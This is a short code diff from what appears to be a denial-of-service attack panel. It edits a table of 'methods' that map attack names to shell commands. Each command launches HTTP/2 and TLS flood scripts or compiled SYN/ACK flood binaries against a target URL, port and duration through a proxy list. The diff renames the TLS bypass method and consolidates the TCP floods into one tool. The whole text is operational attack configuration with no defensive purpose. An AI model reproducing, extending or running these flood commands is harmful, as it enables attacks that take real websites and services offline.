@@ -27,8 +27,8 @@ let methods = {
             Command: 'cd /root/.xyran/ && node h2-flood.js {url} {time} 64 4 px.txt',
             Type: 'layer7'
         },
-        TLSBYPASS: {
-            Command: 'cd /root/.xyran/ && node tls-bypass.js {url} {time} 62 4 px.txt',
+        TLSNET: {
+            Command: 'cd /root/.xyran/ && node tlsnet.js {url} {time} 62 4 px.txt',
             Type: 'layer7'
         },
         HTTPS: {
@@ -54,11 +54,11 @@ let methods = {
             Type: 'layer4'
         },
         SYN: {
-            Command: 'cd /root/.xyran && gcc syn.c -o syn && ./syn {url} {port} 3 25500 {time}',
+            Command: 'cd /root/.xyran && gcc tcp.c -o tcp && ./tcp {url} {port} 4 {time}',
             Type: 'layer4'
         },
         ACK: {
-            Command: 'cd /root/.xyran && gcc ack.c -o ack && ./ack {url} {port} 3 25500 {time}',
+            Command: 'cd /root/.xyran && gcc tcp.c -o tcp && ./tcp {url} {port} 2 {time}',
             Type: 'layer4'
         }
     }
